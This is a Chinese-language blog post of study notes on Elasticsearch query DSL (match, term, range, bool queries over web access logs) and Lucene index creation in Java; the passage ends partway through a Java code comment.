    <content type="html"><![CDATA[<blockquote><p>ES这个组件其实挺重要的，早就应该了解的组件，借着这次机会，我尽量把这个组件摸摸透</p></blockquote><a id="more"></a> <h3 id="ES和结构型数据库的横向对比"><a href="#ES和结构型数据库的横向对比" class="headerlink" title="ES和结构型数据库的横向对比"></a>ES和结构型数据库的横向对比</h3><table><thead><tr><th>MySQL</th><th>ElasticSearch</th></tr></thead><tbody><tr><td>Database</td><td>Index</td></tr><tr><td>Table</td><td>Type</td></tr><tr><td>Row</td><td>Document</td></tr><tr><td>Column</td><td>Field</td></tr><tr><td>Schema</td><td>Mapping</td></tr><tr><td>Index</td><td>Everything Indexed by default</td></tr><tr><td>SQL</td><td>Query DSL(查询专用语言)</td></tr></tbody></table><p>这个表格对ES介绍的很好，从概念上很容易就能把ES和MySQL联系到一起。</p><h3 id="ElasticSearch-版本新特性"><a href="#ElasticSearch-版本新特性" class="headerlink" title="ElasticSearch 版本新特性"></a>ElasticSearch 版本新特性</h3><h3 id="ElasticSearch-Java-API"><a href="#ElasticSearch-Java-API" class="headerlink" title="ElasticSearch Java API"></a>ElasticSearch Java API</h3><p>ES的Java REST Client有两种风格：</p><p>Java Low Level REST Client: 用于Elasticsearch的官方低级客户端。它允许通过http与Elasticsearch集群通信。将请求编排和响应反编排留给用户自己处理。它兼容所有的Elasticsearch版本。</p><p>Java High Level REST Client: 用于Elasticsearch的官方高级客户端。它是基于低级客户端的，它提供很多API，并负责请求的编排与响应的反编排。</p><p>在 Elasticsearch 7.0 中不建议使用TransportClient，并且在8.0中会完全删除TransportClient。因此，官方更建议我们用Java High Level REST Client，它执行HTTP请求，而不是序列号的Java请求。</p><h3 id="ElasticSearch-Query-DSL"><a href="#ElasticSearch-Query-DSL" class="headerlink" title="ElasticSearch Query DSL"></a>ElasticSearch Query DSL</h3><h4 id="查询与过滤"><a href="#查询与过滤" class="headerlink" title="查询与过滤"></a>查询与过滤</h4><p>数据检索分为两种情况：<strong>查询</strong>和<strong>过滤</strong></p><p>Query会对检索结果进行<strong>评分</strong>，注重的点是匹配程度，计算的是查询与文档的相关程度，计算完成之后会酸醋一个评分，记录在<code>_score</code>中，最终按照<code>_score</code>进行排序。</p><p>Filter过滤不会对检索结果进行评分，注重的点是是否匹配，，所以速度 要快一点，并且过滤的结果会被缓存到内存中，性能要比Query高很多。</p><h4 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h4><p>最简单的DSL查询表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /_search //查找整个ES中所有索引的内容</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>/_search</strong> 查找整个ES中所有索引的内容</p><p><strong>query</strong> 为查询关键字，类似的还有<code>aggs</code>为聚合关键字</p><p><strong>match_all</strong> 匹配所有的文档，也可以写<code>match_none</code>不匹配任何文档</p><p>返回结果：</p><p><img src="http://ws4.sinaimg.cn/large/bec9bff2gy1g47rpbap0aj20n30a6gls.jpg" alt="TIM截图20190620175052"></p><p><strong>took：</strong> 表示我们执行整个搜索请求消耗了多少毫秒</p><p><strong>timed_out：</strong> 表示本次查询是否超时</p><p>这里需要注意当<code>timed_out</code>为True时也会返回结果，这个结果是在请求超时时ES已经获取到的数据，所以返回的这个数据可能不完整。</p><p>且当你收到<code>timed_out</code>为True之后，虽然这个连接已经关闭，但在后台这个查询并没有结束，而是会继续执行</p><p><strong>_shards：</strong> 显示查询中参与的分片信息，成功多少分片失败多少分片等</p><p><strong>hits：</strong> 匹配到的文档的信息，其中<code>total</code>表示匹配到的文档总数，<code>max_score</code>为文档中所有<code>_score</code>的最大值</p><p>hits中的<code>hits</code>数组为查询到的文档结果，默认包含查询结果的前十个文档，每个文档都包含文档的<code>_index</code>、<code>_type</code>、<code>_id</code>、<code>_score</code>和<code>_source</code>数据</p><p>结果文档默认情况下是按照相关度（_score）进行降序排列，也就是说最先返回的是相关度最高的文档，文档相关度意思是文档内容与查询条件的匹配程度，上边的查询与过滤中有介绍</p><h4 id="指定索引"><a href="#指定索引" class="headerlink" title="指定索引"></a>指定索引</h4><ol><li><p>指定固定索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index1/_search</span><br></pre></td></tr></table></figure></li><li><p>指定多个索引：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index1,index2/_search</span><br></pre></td></tr></table></figure><ol start="3"><li>用*号匹配，在匹配到的所有索引下查找数据</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index-*/_search</span><br></pre></td></tr></table></figure><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>因为<code>hits</code>默认只展示10个文档，那我们如何查询10个以后的文档呢？ES中给力size和from两个参数。</p><p>size: 设置一次返回的结果数量，也就是<code>hits</code>中文档的数量，默认是10</p><p>from:  设置从第几个结果开始往后查询，默认值是0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 5,</span><br><span class="line">  &quot;from&quot;: 10,</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这条命令的意义是：显示第11条到15个文档的数据。</p><p><code>match_all</code>为查询所有记录，常用的查询关键字在ES中还有<code>match</code>、<code>multi_match</code>、<code>query_string</code>、<code>term</code>、<code>range</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;host&quot;:&quot;ops-coffee.cn&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;multi_match&quot;: &#123;</span><br><span class="line">      &quot;query&quot;:&quot;ops-coffee.cn&quot;,</span><br><span class="line">      &quot;fields&quot;:[&quot;host&quot;,&quot;http_referer&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//在多个字段上搜索时用multi_match</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;query_string&quot;: &#123;</span><br><span class="line">      &quot;query&quot;:&quot;(a.ops-coffee.cn) OR (b.ops-coffee.cn)&quot;,</span><br><span class="line">      &quot;fields&quot;:[&quot;host&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//可以在查询里边使用AND或者OR来完成复杂的查询</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;query_string&quot;: &#123;</span><br><span class="line">      &quot;query&quot;:&quot;host:a.ops-coffee.cn OR (host:b.ops-coffee.cn AND status:403)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//以上表示查询（host为a.ops-coffee.cn）或者是（host为b.ops-coffee.cn且status为403）的所有记录\</span><br><span class="line">与其像类似的还有个simple_query_string的关键字，可以将query_string中的AND或OR用+或|这样的符号替换掉</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//term表示了精确匹配，精确匹配的可以是数字，时间，布尔值或者是设置了not_analyzed不分词的字符串</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;term&quot;: &#123;</span><br><span class="line">      &quot;status&quot;: &#123;</span><br><span class="line">        &quot;value&quot;: 404</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//匹配多个值</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;terms&quot;: &#123;</span><br><span class="line">      &quot;status&quot;:[403,404]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">//range用来查询落在指定区间里的数字或者时间</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;:&#123;</span><br><span class="line">      &quot;status&quot;:&#123;</span><br><span class="line">        &quot;gte&quot;: 400,</span><br><span class="line">        &quot;lte&quot;: 599</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//range用来查询落在指定区间内的数字或者时间</span><br><span class="line">范围关键字主要有四个：</span><br><span class="line">gt: 大于</span><br><span class="line">gte: 大于等于</span><br><span class="line">lt: 小于</span><br><span class="line">lte: 小于等于</span><br><span class="line"></span><br><span class="line">并且：当range把日期作为查询范围时，我们需注意下日期的格式，官方支持的日期格式主要有两种</span><br><span class="line">1.时间戳（ms）</span><br><span class="line">get /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">      &quot;@timestamp&quot;: &#123;</span><br><span class="line">        &quot;gte&quot;: 1557676800000,</span><br><span class="line">        &quot;lte&quot;: 1557680400000,</span><br><span class="line">        &quot;format&quot;:&quot;epoch_millis&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.日期字符串</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;:&#123;</span><br><span class="line">      &quot;@timestamp&quot;:&#123;</span><br><span class="line">        &quot;gte&quot;: &quot;2019-05-13 18:30:00&quot;,</span><br><span class="line">        &quot;lte&quot;: &quot;2019-05-14&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss||yyyy-MM-dd&quot;,</span><br><span class="line">        &quot;time_zone&quot;: &quot;+08:00&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">日期格式可以按照自己的习惯输入，只需要format字段指定匹配的格式，如果格式有多个就用||分开，不过推荐用相同的日期格式。</span><br><span class="line">如果日期中缺少年月日这些内容，那么缺少的部分会用unix的开始时间（即1970年1月1日）填充，当你将&quot;format&quot;:&quot;dd&quot;指定为格式时，那么&quot;gte&quot;:10将被转换成1970-01-10T00:00:00.000Z</span><br><span class="line">elasticsearch中默认使用的是UTC时间，所以我们在使用时要通过time_zone来设置好时区，以免出错</span><br></pre></td></tr></table></figure><h3 id="组合查询"><a href="#组合查询" class="headerlink" title="组合查询"></a>组合查询</h3><p>通常我们可能需要将很多个条件组合在一起查处最后的结果，这个时候就需要使用es提供的<code>bool</code>来实现。</p><p>Ex. 要查询<code>host</code>为<code>ops-coffee.cn</code>且<code>http_x_forworded_for</code>为<code>111.18.78.128</code>且<code>status</code>不为200的所有数据就可以使用下边的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line"> &quot;query&quot;:&#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: [</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;host&quot;: &quot;ops-coffee.cn&quot;</span><br><span class="line">        &#125;&#125;,</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;http_x_forwarded_for&quot;: &quot;111.18.78.128&quot;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;must_not&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;status&quot;: 200</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">组合查询设计四个关键字组合设计查询之间的关系。分别为：</span><br><span class="line">must: 类似于SQL中的AND，必须包含</span><br><span class="line">must_not: 类似于SQL中的NOT，必须不包含</span><br><span class="line">should: 满足这些条件中的任何条件都会增加评分_score，不满足也不影响，should只会影响查询结果的_score值，并不会影响结果的内容</span><br><span class="line">filter: 与must相似，但不会对结果进行相关性评分_score，大多数情况下我们对于日志的需求都无相关性的要求，所以建议查询的过程中多用filter</span><br></pre></td></tr></table></figure><h3 id="全文检索"><a href="#全文检索" class="headerlink" title="全文检索"></a>全文检索</h3><p>全文检索就是对一篇文章进行索引，可以根据关键字搜索，类似于mysql里的like语句。 </p><p>全文索引就是把内容根据词的意义进行分词，然后分别创建索引，例如”你们的激情是因为什么事情来的” 可能会被分词成：“你们“，”激情“，“什么事情“，”来“ 等token，这样当你搜索“你们” 或者 “激情” 都会把这句搜出来。</p><h3 id="ES调优"><a href="#ES调优" class="headerlink" title="ES调优"></a>ES调优</h3><p><a href="https://juejin.im/post/5c3e9813518825552880084a" target="_blank" rel="noopener">调优</a></p><h3 id="Lucene"><a href="#Lucene" class="headerlink" title="Lucene"></a>Lucene</h3><p><strong>介绍</strong>: Lucene是apache软件基金会发布的一个开放源代码的全文检索引擎工具包，由资深全文检索专家Doug Cutting所撰写,它是一个<strong>全文检索引擎的架构</strong>，提供了完整的创建索引和查询索引，以及部分文本分析的引擎。</p><p><strong>特色</strong>: Lucene的目的是为软件开发人员提供一个简单易用的工具包，以方便在目标系统中实现全文检索的功能，或者是以此为基础建立起完整的全文检索引擎，Lucene在全文检索领域是一个经典的祖先，现在很多检索引擎都是在其基础上创建的，思想是相通的。</p><p><strong>Lucene是根据关健字来搜索的文本搜索工具，只能在某个网站内部搜索文本内容，不能跨网站搜索</strong></p><p>为什么有了数据库还要使用Lucene:</p><ul><li>（1）SQL只能针对数据库表搜索，<strong>不能直接针对硬盘上的文本搜索</strong></li><li>（2）<strong>SQL没有相关度排名</strong></li><li>（3）<strong>SQL搜索结果没有关健字高亮显示</strong></li><li>（4）<strong>SQL需要数据库的支持</strong>，数据库本身需要内存开销较大，例如：Oracle</li><li>（5）<strong>SQL搜索有时较慢</strong>，尤其是数据库不在本地时，超慢，例如：Oracle</li></ul><p>以上所说的，我们如果使用SQL的话，是做不到的。因此我们就学习<strong>Lucene来帮我们在站内根据文本关键字来进行搜索数据</strong>！</p><p>我们如果网站需要根据关键字来进行搜索，可以使用SQL，也可以使用Lucene…那么我们<strong>Lucene和SQL是一样的，都是在持久层中编写代码的</strong>。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g4fiswh248j20so0d7gs3.jpg" alt></p><p>Lucene中存的就是<strong>一系列的二进制压缩文件和一些控制文件</strong>，它们位于计算机的硬盘上，<br><strong>这些内容统称为索引库</strong>，索引库有二部份组成：</p><ul><li><p>（1）<strong>原始记录</strong></p></li><li><ul><li>存入到索引库中的原始文本，例如：我是钟福成</li></ul></li><li><p>（2）<strong>词汇表</strong></p></li><li><ul><li>按照一定的拆分策略（即分词器）将原始记录中的每个字符拆开后，存入一个供将来搜索的表</li></ul></li></ul><p>也就是说：<strong>Lucene存放数据的地方我们通常称之为索引库，索引库又分为两部分组成：原始记录和词汇表</strong>….</p><h4 id="原始记录和词汇表"><a href="#原始记录和词汇表" class="headerlink" title="原始记录和词汇表"></a>原始记录和词汇表</h4><p>当我们想要把数据存到索引库的时候，我们首先存入的是将数据存到原始记录上面去….</p><p>又由于我们给用户使用的时候，用户<strong>使用的是关键字来进行查询我们的具体记录</strong>。因此，我们需要把我们<strong>原始存进的数据进行拆分</strong>！将<strong>拆分出来的数据存进词汇表中</strong>。</p><p>词汇表就是类似于我们在学Oracle中的索引表，<strong>拆分的时候会给出对应的索引值。</strong></p><p>一旦用户根据关键字来进行搜索，那<strong>么程序就先去查询词汇表中有没有该关键字，如果有该关键字就定位到原始记录表中，将符合条件的原始记录返回给用户查看</strong>。</p><p>我们查看以下的图方便理解：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g4fiusyxfzj20sy0dcqct.jpg" alt></p><p>到了这里，有人可能就会疑问：难道原始记录拆分的数据都是一个一个汉字进行拆分的吗？？然后在词汇表中不就有很多的关键字了？？？</p><p>其实，我们在存到原始记录表中的时候，可以指定我们使用哪种算法来将数据拆分，存到词汇表中…..我们的<strong>图是Lucene的标准分词算法，一个一个汉字进行拆分</strong>。我们可以使用别的分词算法，两个两个拆分或者其他的算法。</p><h4 id="Lucene程序："><a href="#Lucene程序：" class="headerlink" title="Lucene程序："></a>Lucene程序：</h4><p>首先要导入必要的Lucene的必要开发包</p><ul><li><strong>lucene-core-3.0.2.jar【Lucene核心】</strong></li><li><strong>lucene-analyzers-3.0.2.jar【分词器】</strong></li><li><strong>lucene-highlighter-3.0.2.jar【Lucene会将搜索出来的字，高亮显示，提示用户】</strong></li><li><strong>lucene-memory-3.0.2.jar【索引库优化策略】</strong></li></ul><p>创建User对象，User对象封装了数据….</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ozc on 2017/7/12.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String id ;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String sal;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String id, String userName, String sal)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.sal = sal;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSal</span><span class="params">(String sal)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sal = sal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想要使用Lucene来查询出站内的数据，首先我们得要有个索引库吧！于是<strong>我们先创建索引库，将我们的数据存到索引库中</strong>。</p><p>创建索引库的步骤：</p><ul><li>1）<strong>创建JavaBean对象</strong></li><li>2）<strong>创建Docment对象</strong></li><li>3）<strong>将JavaBean对象所有的属性值，均放到Document对象中去，属性名可以和JavaBean相同或不同</strong></li><li>4）<strong>创建IndexWriter对象</strong></li><li>5）<strong>将Document对象通过IndexWriter对象写入索引库中</strong></li><li>6）<strong>关闭IndexWriter对象</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//把数据填充到JavaBean对象中</span></span><br><span class="line">    User user = <span class="keyword">new</span> User(<span class="string">"1"</span>, <span class="string">"钟福成"</span>, <span class="string">"未来的程序员"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Document对象【导入的是Lucene包下的Document对象】</span></span><br><span class="line">    Document document = <span class="keyword">new</span> Document();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将JavaBean对象所有的属性值，均放到Document对象中去，属性名可以和JavaBean相同或不同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 向Document对象加入一个字段</span></span><br><span class="line"><span class="comment">     * 参数一：字段的关键字</span></span><br><span class="line"><span class="comment">     * 参数二：字符的值</span></span><br><span class="line"><span class="comment">     * 参数三：是否要存储到原始记录表中</span></span><br><span class="line"><span class="comment">     *      YES表示是</span></span><br><span class="line"><span class="comment">     *      NO表示否</span></span><br><span class="line"><span class="comment">     * 参数四：是否需要将存储的数据拆分到词汇表中</span></span><br><span class="line"><span class="comment">     *      ANALYZED表示拆分</span></span><br><span class="line"><span class="comment">     *      NOT_ANALYZED表示不拆分</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    document.add(<span class="keyword">new</span> Field(<span class="string">"id"</span>, user.getId(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">    document.add(<span class="keyword">new</span> Field(<span class="string">"userName"</span>, user.getUserName(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">    document.add(<span class="keyword">new</span> Field(<span class="string">"sal"</span>, user.getSal(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建IndexWriter对象</span></span><br><span class="line">    <span class="comment">//目录指定为E:/createIndexDB</span></span><br><span class="line">    Directory directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用标准的分词算法对原始记录表进行拆分</span></span><br><span class="line">    Analyzer analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LIMITED默认是1W个</span></span><br><span class="line">    IndexWriter.MaxFieldLength maxFieldLength = IndexWriter.MaxFieldLength.LIMITED;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * IndexWriter将我们的document对象写到硬盘中</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 参数一：Directory d,写到硬盘中的目录路径是什么</span></span><br><span class="line"><span class="comment">     * 参数二：Analyzer a, 